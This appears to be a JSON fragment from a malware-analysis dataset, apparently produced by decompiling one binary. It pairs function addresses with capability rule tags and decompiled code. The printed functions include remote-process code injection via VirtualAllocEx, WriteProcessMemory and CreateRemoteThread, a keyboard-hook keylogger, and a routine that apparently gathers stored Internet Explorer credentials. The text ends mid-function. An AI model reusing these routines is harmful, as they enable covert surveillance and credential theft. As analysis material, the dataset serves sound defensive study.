        "decompiled_code": "\nint32_t __cdecl fcn.00407574(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_4ch;\n    uint hThread;\n    uint var_24h;\n    uint var_20h;\n    uint hMutex;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    uint32_t var_8h;\n    \n    var_ch = in_ECX;\n    fcn.0041026f();\n    var_8h = 0;\n    if (in_ECX[2] != 0) {\n        var_10h = 0;\n        do {\n            iVar5 = var_10h;\n            fcn.00405ca3();\n            uVar2 = var_8h;\n            var_14h = var_8h + 1;\n            if (*(*in_ECX + iVar5 + 4) == arg_ch) {\n                fcn.00405ca3();\n                fcn.00405ea5();\n                piVar1 = var_ch;\n                fcn.00405ca3();\n                iVar5 = (*_sym.imp.KERNEL32.dll_TerminateThread)(*(*piVar1 + uVar2 * 0xc), 0);\n                var_10h = iVar5;\n                fcn.00405ca3();\n                uVar2 = var_ch[2];\n                if (var_14h <= uVar2) {\n                    iVar4 = var_14h * 0xc;\n                    uVar3 = var_14h;\n                    do {\n                        puVar6 = *var_ch + iVar4;\n                        uVar3 = uVar3 + 1;\n                        iVar4 = iVar4 + 0xc;\n                        puVar6[-3] = *puVar6;\n                        puVar6[-2] = puVar6[1];\n                        puVar6[-1] = puVar6[2];\n                        uVar2 = var_ch[2];\n                        iVar5 = var_10h;\n                    } while (uVar3 <= uVar2);\n                }\n                var_ch[2] = uVar2 - 1;\n                if (arg_10h != 0) {\n                    var_18h = 0;\n                    var_14h = 0;\n                    arg_8h_00 = fcn.004040ea(arg_ch, 0, 0, 0, 0, 0, &var_18h, 3);\n                    fcn.00404f2b(arg_8h_00);\n                    fcn.00404050();\n                    fcn.00403036();\n                }\n                goto code_r0x004075da;\n            }\n            var_10h = var_10h + 0xc;\n            var_8h = var_14h;\n        } while (var_14h < in_ECX[2]);\n    }\n    iVar5 = 0;\ncode_r0x004075da:\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[4]);\n    return iVar5;\n}\n",
        "token_count": 741
    },
    "004077e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004077e3(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 != 0) {\n        fcn.00410125();\n    }\n    fcn.0040feed();\n    if (param_1[1] != 0) {\n        for (iVar1 = *(param_1[1] + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.00403036();\n        }\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 153
    },
    "0040783b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040783b(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t dwMoveMethod;\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t nNumberOfBytesToRead;\n    \n    if ((*in_ECX == 0) || (in_ECX[0xc] <= arg_8h && arg_8h != in_ECX[0xc])) {\n        uVar1 = 0;\n    }\n    else {\n        dwMoveMethod = in_ECX[0xb] * arg_8h;\n        nNumberOfBytesToRead = in_ECX[10] - dwMoveMethod;\n        if (nNumberOfBytesToRead < in_ECX[0xb]) {\n            uVar1 = fcn.0040fe3d(arg_ch, nNumberOfBytesToRead, dwMoveMethod);\n            arg_8h_00 = fcn.00401085(in_ECX[0xb] - nNumberOfBytesToRead);\n            fcn.00402f91(arg_8h_00, in_ECX[0xb] - nNumberOfBytesToRead);\n            fcn.00401099(arg_8h_00);\n        }\n        else {\n            uVar1 = fcn.0040fe3d(arg_ch, in_ECX[0xb], dwMoveMethod);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 311
    },
    "004079e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004079e8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint lpBuffer;\n    uint lpBaseAddress;\n    uint lpflOldProtect;\n    int32_t lpNumberOfBytesWritten;\n    int32_t var_4h;\n    \n    if (*0x419694 == '\\0') {\n        iVar1 = fcn.00408617();\n        *0x419694 = iVar1 != 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, arg_8h);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(iVar1, 0, 0x100000, 0x3000, 0x40);\n        if (iVar3 != 0) {\n            lpflOldProtect = 0;\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(iVar1, iVar3, 0x100000, 0x40, &lpflOldProtect);\n            iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(iVar1, 0x33370000, 0x100, 0x3000, 0x40);\n            if (iVar4 != 0) {\n                var_4h = 0;\n                uVar2 = fcn.00401133(\"XXXXXX\", &var_4h);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(iVar1, iVar4, \"XXXXXX\", uVar2);\n                if ((iVar4 != 0) && (iVar4 = fcn.00401133(\"XXXXXX\"),  var_4h == iVar4)) {\n                    lpNumberOfBytesWritten = 0;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(iVar1, iVar3, in_ECX);\n                    if ((iVar4 != 0) && (lpNumberOfBytesWritten == in_EDX)) {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(iVar1, 0, 0, iVar3, 0, 0, 0);\n                        return uVar2;\n                    }\n                }\n                return 0xfffffffd;\n            }\n        }\n        uVar2 = 0xfffffffe;\n    }\n    return uVar2;\n}\n",
        "token_count": 564
    },
    "00407af1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407af1(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_10h;\n    int32_t iVar3;\n    uint noname_2;\n    int32_t in_EDX;\n    uint arg_ch;\n    int64_t iVar4;\n    uint *arg_14h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*0x419694 == '\\0') {\n        iVar1 = fcn.00408617();\n        *0x419694 = iVar1 != 0;\n    }\n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        iVar1 = fcn.00407948();\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, iVar1);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar4 = fcn.00408633(0, 0);\n        arg_ch = iVar4 >> 0x20;\n        uVar2 = iVar4;\n        if (iVar4 != 0) {\n            var_8h = 0;\n            fcn.0040878c(uVar2, arg_ch, noname_2, &var_8h);\n            iVar4 = fcn.00408633(0x33370000, 0);\n            if (iVar4 != 0) {\n                arg_8h = 0;\n                arg_14h = &arg_8h;\n                arg_10h = fcn.00401133(\"XXXXXX\");\n                iVar3 = fcn.00408568(iVar4, iVar4 >> 0x20, arg_10h, arg_14h);\n                if ((iVar3 != 0) && (iVar3 = fcn.00401133(\"XXXXXX\"),  arg_8h == iVar3)) {\n                    arg_8h = 0;\n                    iVar3 = fcn.00408568(uVar2, arg_ch, var_4h, &arg_8h);\n                    if ((iVar3 != 0) && (arg_8h == var_4h)) {\n                        uVar2 = fcn.004086e1(iVar1, iVar1 >> 0x1f, uVar2, arg_ch);\n                        return uVar2;\n                    }\n                }\n                return 0xfffffffd;\n            }\n        }\n        uVar2 = 0xfffffffe;\n    }\n    return uVar2;\n}\n",
        "token_count": 596
    },
    "00407fe6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00407fe6(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint var_5c8h;\n    int32_t var_5b0h;\n    int32_t var_5ach;\n    uint var_248h;\n    int32_t var_1e8h;\n    uint *var_1e4h;\n    uint var_160h;\n    int32_t var_150h;\n    uint *var_14ch;\n    int32_t var_108h;\n    uint *var_104h;\n    uint *var_d8h;\n    uint var_d4h;\n    uint var_aeh;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint *var_4h;\n    \n    if (*0x419698 != 0) {\n        iVar2 = fcn.0040825d();\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        if ((var_1e8h != 0) || (var_1e4h != NULL)) {\n            return var_1e4h;\n        }\n        var_4h = &var_160h;\n        if ((var_5b0h != 0) || (var_5ach != 0)) {\n            return var_4h;\n        }\n        var_14h = &var_108h;\n        var_1ch = 0x10;\n        var_18h = 0;\n        var_108h = var_150h;\n        do {\n            if ((var_108h != 0) || (var_14ch != NULL)) {\n                return var_14ch;\n            }\n            var_104h = var_14ch;\n            var_4h = fcn.00401085(var_aeh);\n            if (var_4h == NULL) {\n                return NULL;\n            }\n            var_10h = &var_4h;\n            var_ch = CONCAT31(var_ch._1_3_, 1);\n            fcn.00408327(var_a8h, var_a4h);\n            iVar1 = fcn.00408502();\n            if (iVar1 == 0) {\n                fcn.00401f2c();\n                return var_d8h;\n            }\n            fcn.00401f2c();\n            var_14ch = var_104h;\n        } while ((var_108h != 0x10) || (var_104h != NULL));\n    }\n    return NULL;\n}\n",
        "token_count": 606
    },
    "0040839e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __cdecl\nfcn.0040839e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint arg_10h, uint arg_14h)\n\n{\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_1ch_3;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2ch_2;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h;\n    uint var_1ch_2;\n    uint var_18h;\n    uint var_14h_2;\n    uint var_10h;\n    \n    if (*0x419698 != 0) {\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        return CONCAT44(var_44h >> 0x1f, 0x2b);\n    }\n    return 0;\n}\n",
        "token_count": 468
    },
    "004089d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004089d5(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int16_t iVar3;\n    uint in_ECX;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint lpString;\n    uint ARG_0;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    if ((in_EDX != 0x100) && (in_EDX != 0x104)) goto code_r0x00408e0b;\n    uVar1 = *arg_8h;\n    if (uVar1 < 0x27) {\n        if (0x40 < uVar1) goto code_r0x00408ab3;\ncode_r0x00408aff:\n        if (uVar1 < 0x67) {\n            if (uVar1 != 0x66) {\n                if (uVar1 < 0x21) {\n                    if (uVar1 != 0x20) {\n                        if (uVar1 < 0x12) {\n                            if (((uVar1 != 0x11) && (uVar1 != 8)) && ((uVar1 != 9 && (uVar1 != 0xd)))) {\n                                if (uVar1 == 0x10) goto code_r0x00408e0b;\n                                goto code_r0x00408da2;\n                            }\n                        }\n                        else if (((uVar1 != 0x12) && (uVar1 != 0x14)) && (uVar1 != 0x1b)) goto code_r0x00408da2;\n                    }\n                }\n                else if (uVar1 < 99) {\n                    if (((uVar1 != 0x62) && (uVar1 != 0x2d)) &&\n                       ((uVar1 != 0x2e && ((uVar1 != 0x60 && (uVar1 != 0x61)))))) {\ncode_r0x00408da2:\n                        (*_sym.imp.USER32.dll_GetKeyNameTextW)\n                                  ((arg_8h[2] * 0x100 + arg_8h[1]) * 0x10000 + 1, &lpString, 0xf);\n                    }\n                }\n                else if (((uVar1 != 99) && (uVar1 != 100)) && (uVar1 != 0x65)) goto code_r0x00408da2;\n            }\n        }\n        else if (uVar1 < 0xbd) {\n            if (uVar1 == 0xbc) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 < 0xa4) {\n                if ((((uVar1 < 0xa2) && (uVar1 != 0x67)) && (uVar1 != 0x68)) && (uVar1 != 0x69)) {\n                    if (uVar1 - 0xa0 < 2) goto code_r0x00408e0b;\n                    goto code_r0x00408da2;\n                }\n            }\n            else if (0xa5 < uVar1) {\n                if (uVar1 == 0xba) {\n                    (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                }\n                else {\n                    if (uVar1 != 0xbb) goto code_r0x00408da2;\n                    (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                }\n            }\n        }\n        else if (uVar1 < 0xdc) {\n            if (uVar1 == 0xdb) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbd) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbe) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else if (uVar1 == 0xbf) {\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n            else {\n                if (uVar1 != 0xc0) goto code_r0x00408da2;\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n            }\n        }\n        else if (uVar1 == 0xdc) {\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n        else if (uVar1 == 0xdd) {\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n        else {\n            if (uVar1 != 0xde) goto code_r0x00408da2;\n            (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        }\n    }\n    else {\n        if (0x40 < uVar1) {\ncode_r0x00408ab3:\n            if (uVar1 < 0x5b) {\n                var_4h = in_ECX;\n                fcn.00408e5b();\n                (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n                cVar2 = fcn.00408e49();\n                uVar4 = uVar1 + 0x20;\n                if (cVar2 != '\\0') {\n                    uVar4 = uVar1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x414b18, uVar4);\n                fcn.00408e66();\n                in_ECX = var_4h;\n                goto code_r0x00408e0b;\n            }\n            goto code_r0x00408aff;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetAsyncKeyState)(0x10);\n        if (iVar3 == 0) {\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x414b18, uVar1);\n        }\n        else {\n            if (9 < uVar1 - 0x30) goto code_r0x00408e0b;\n    // switch table (10 cases) at 0x408e21\n            switch(*((uVar1 - 0x30) * 4 + 0x408e21)) {\n            case 0x408a2f:\n                break;\n            case 0x408a39:\n                break;\n            case 0x408a43:\n                break;\n            case 0x408a4d:\n                break;\n            case 0x408a57:\n                break;\n            case 0x408a61:\n                break;\n            case 0x408a6b:\n                break;\n            case 0x408a75:\n                break;\n            case 0x408a7f:\n                break;\n            case 0x408a89:\n            }\n        }\n    }\n    fcn.00408e66();\ncode_r0x00408e0b:\n    (*_sym.imp.USER32.dll_CallNextHookEx)(0, in_ECX, var_8h, arg_8h);\n    return;\n}\n",
        "token_count": 1600
    },
    "004093c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpKeyState\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.004093c8(uint8_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint pwszBuff;\n    uint lpKeyState;\n    \n    fcn.00401052(&pwszBuff, 0, 0x100);\n    uVar2 = param_1;\n    uVar1 = (*_sym.imp.USER32.dll_MapVirtualKeyA)(uVar2, 0);\n    if (uVar2 < 0x5d) {\n        if (uVar2 < 0x5b) {\n            if (uVar2 < 0x15) {\n                if (uVar2 != 0x14) {\n                    if (uVar2 < 8) goto code_r0x00409482;\n                    if ((9 < uVar2) && (uVar2 != 0xd)) {\n                        if (uVar2 < 0x10) goto code_r0x00409482;\n                        bVar3 = uVar2 < 0x12;\n                        bVar4 = uVar2 == 0x12;\n                        goto code_r0x00409422;\n                    }\n                }\n            }\n            else if ((uVar2 < 0x20) || ((0x28 < uVar2 && (uVar2 != 0x2e)))) goto code_r0x00409482;\n        }\n    }\n    else if (uVar2 < 0xb4) {\n        if (uVar2 < 0xb2) {\n            if (uVar2 < 0x60) goto code_r0x00409482;\n            if (0x69 < uVar2) {\n                if (uVar2 < 0xad) goto code_r0x00409482;\n                bVar3 = uVar2 < 0xaf;\n                bVar4 = uVar2 == 0xaf;\ncode_r0x00409422:\n                if (!bVar3 && !bVar4) goto code_r0x00409482;\n            }\n        }\n    }\n    else if ((uVar2 < 0xba) || ((0xc0 < uVar2 && (3 < uVar2 - 0xdb)))) goto code_r0x00409482;\n    uVar1 = uVar1 | 0x100;\ncode_r0x00409482:\n    lpKeyState._0_1_ = (*_sym.imp.USER32.dll_GetKeyState)(uVar2);\n    (*_sym.imp.USER32.dll_ToUnicode)(uVar2, uVar1, &lpKeyState, &pwszBuff, 1, 0);\n    return &pwszBuff;\n}\n",
        "token_count": 621
    },
    "004098c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004098c4(void)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x54db10);\n    if (*0x54d0e8 != 0) {\n        fcn.00401f76();\n        *0x54d0e8 = 0;\n        fcn.00401f4b(fcn.0040882f, 0x54d0e8);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x54db10);\n    return;\n}\n",
        "token_count": 118
    },
    "0040990a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040990a(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n    puVar2 = &lpCriticalSection;\n    puVar3 = 0x54db10;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x54db10);\n    *0x54db38 = arg_8h;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0);\n    *0x4196a0 = 0x54d0e8;\n    if (arg_ch == 0) {\n        fcn.00401f76();\n        *0x54d0e8 = 1;\n        fcn.00401f4b(fcn.004095aa, 0x54d0e8);\n    }\n    else {\n        fcn.00401f4b(fcn.0040882f, 0x54d0e8);\n        *0x54dafc = 1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x54db10);\n    return;\n}\n",
        "token_count": 356
    },
    "0040b203": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __fastcall fcn.0040b203(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint uStack88;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    var_ch = 0;\n    var_28h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    var_4h = 0;\n    var_50h = 0;\n    iVar1 = fcn.0040b559();\n    if ((((iVar1 != 0) && (iVar1 = (**(param_1 + 0x8c))(0x419140, 0, &var_ch),  iVar1 == 0)) &&\n        (iVar1 = (**(param_1 + 0x94))(var_ch, 0x200, &var_28h, &var_10h),  iVar1 == 0)) && (var_28h != 0)) {\n        var_4ch = 0;\n        var_24h = 0;\n        var_20h = 0;\n        do {\n            iVar1 = fcn.0040b526();\n            if (iVar1 == 0) {\n                var_18h = var_10h + var_24h;\n                iVar1 = fcn.00401000(iVar3, 0x419130, 0x10);\n                if (iVar1 == 0) {\n                    fcn.004035e5(*(var_18h + 0x10));\n                    uVar2 = fcn.004035e5(L\"Internet Explorer\");\n                    iVar1 = fcn.00403248(uVar2);\n                    fcn.00405ea5();\n                    iVar3 = var_4h;\n                    var_3ch = 0;\n                    if (iVar1 != 0) {\n                        var_60h = *0x417580;\n                        var_5ch = *0x417584;\n                        var_58h = *0x417588;\n                        uStack88 = *0x41758c;\n                        uVar2 = fcn.004035e5(*(var_4h + 0x14) + 0x20);\n                        fcn.00403437(uVar2);\n                        fcn.00405ea5();\n                        var_40h = 0;\n                        uVar2 = fcn.004035e5(*(iVar3 + 0x18) + 0x20);\n                        fcn.00403437(uVar2);\n                        fcn.00405ea5();\n                        var_8h = 0;\n                        var_44h = 0;\n                        iVar3 = (**(param_1 + 0x98))\n                                          (var_ch, var_18h, *(var_18h + 0x14), *(var_18h + 0x18), 0, 0, 0, &var_8h);\n                        if (iVar3 == 0) {\n                            var_4h = var_8h;\n                            var_60h = *(var_18h + 0x1c) + 0x20;\n                            var_5ch = fcn.004035e5(var_60h);\n                            fcn.00403437(var_5ch);\n                            fcn.00405ea5();\n                            var_48h = 0;\n                        }\n                        puVar4 = &var_60h;\n                        fcn.00401f95(puVar4);\n                        fcn.00401fcb(puVar4);\n                        fcn.004013ef();\n                    }\n                    fcn.00405ea5();\n                    var_1ch = 0;\n                    iVar3 = var_4h;\n                }\n            }\n            else {\n                iVar3 = var_20h + var_10h;\n                var_4h = iVar3;\n                iVar1 = fcn.00401000(iVar3, 0x419130, 0x10);\n                if (iVar1 == 0) {\n                    fcn.004035e5(*(iVar3 + 0x10));\n                    uVar2 = fcn.004035e5(L\"Internet Explorer\");\n                    iVar1 = fcn.00403248(uVar2);\n                    fcn.00405ea5();\n                    iVar3 = var_4h;\n                    var_2ch = 0;\n                    if (iVar1 != 0) {\n                        var_60h = *0x417580;\n                        var_5ch = *0x417584;\n                        var_58h = *0x417588;\n                        uStack88 = *0x41758c;\n                        uVar2 = fcn.004035e5(*(var_4h + 0x14) + 0x20);\n                        fcn.00403437(uVar2);\n                        fcn.00405ea5();\n                        var_30h = 0;\n                        uVar2 = fcn.004035e5(*(iVar3 + 0x18) + 0x20);\n                        fcn.00403437(uVar2);\n                        fcn.00405ea5();\n                        var_8h = 0;\n                        var_34h = 0;\n                        iVar3 = (**(param_1 + 0x98))(var_ch, iVar3, *(iVar3 + 0x14), *(iVar3 + 0x18), 0, 0, 0, &var_8h);\n                        if (iVar3 == 0) {\n                            var_4h = var_8h;\n                            var_60h = *(var_8h + 0x1c) + 0x20;\n                            var_5ch = fcn.004035e5(var_60h);\n                            fcn.00403437(var_5ch);\n                            fcn.00405ea5();\n                            var_38h = 0;\n                        }\n                        puVar4 = &var_60h;\n                        fcn.00401f95(puVar4);\n                        fcn.00401fcb(puVar4);\n                        fcn.004013ef();\n                    }\n                    fcn.00405ea5();\n                    var_14h = 0;\n                    iVar3 = var_4h;\n                }\n            }\n            var_20h = var_20h + 0x38;\n            var_4ch = var_4ch + 1;\n            var_24h = var_24h + 0x34;\n        } while (var_4ch < var_28h);\n    }\n    if (var_10h != 0) {\n        (**(param_1 + 0xa0))(var_10h);\n    }\n    if (var_ch != 0) {\n        (**(param_1 + 0x90))(&var_ch);\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(*(param_1 + 0xc0));\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 1749
    },
    "0040ba00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ba00(uint arg_8h, char *pszPath)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_ECX;\n    uint uVar7;\n    uint lpBuffer;\n    uint var_c28h;\n    uint var_a28h;\n    uint var_828h;\n    uint var_628h;\n    uint var_428h;\n    uint lpPathName;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    uVar7 = 0;\n    fcn.00401052(&lpBuffer, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x104, &lpBuffer);\n    if ((pszPath == 0x1) &&\n       (((((*(in_ECX + 0xb8) == 0 || (*(in_ECX + 0xac) == 0)) || (*(in_ECX + 0xb0) == 0)) ||\n         ((*(in_ECX + 0xbc) == 0 || (*(in_ECX + 0xa4) == 0)))) || (*(in_ECX + 0xb4) == 0)))) {\n        fcn.00413786(&var_1ch, *(*0x4196a4 + 8), 5);\n        if (var_18h == 0) {\n            fcn.00403036();\n            goto code_r0x0040c107;\n        }\n        fcn.00401052(&var_a28h, 0, 0x100);\n        fcn.00401052(&var_428h, 0, 0x100);\n        fcn.00401052(&var_828h, 0, 0x100);\n        fcn.00401052(&var_628h, 0, 0x100);\n        fcn.00401052(&var_c28h, 0, 0x100);\n        fcn.00401052(&lpPathName, 0, 0x100);\n        var_ch = fcn.00401085(0x519d0);\n        var_8h = fcn.00401085(0x217d0);\n        pszPath = fcn.00401085(0x6b738);\n        pcVar4 = fcn.00401085(0x1303d0);\n        var_14h = pcVar4;\n        var_10h = fcn.00401085(0x235d0);\n        var_4h = fcn.00401085(0x14748);\n        fcn.0040102c(var_ch, var_1ch, 0x519d0);\n        fcn.0040102c(var_8h, var_1ch + 0x519d0, 0x217d0);\n        fcn.0040102c(pszPath, var_1ch + 0x731a0, 0x6b738);\n        fcn.0040102c(pcVar4, var_1ch + 0xde8d8, 